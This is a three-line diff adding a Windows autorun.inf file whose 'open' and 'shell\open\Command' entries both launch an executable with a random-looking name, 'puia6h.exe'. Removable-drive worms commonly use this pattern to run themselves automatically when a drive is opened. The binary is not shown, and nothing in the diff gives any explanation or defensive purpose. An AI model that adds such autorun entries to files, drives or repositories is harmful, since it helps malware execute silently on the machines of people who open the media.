@@ -1,0 +1,3 @@
+[AutoRun]
+open=puia6h.exe
+shell\open\Command=puia6h.exe
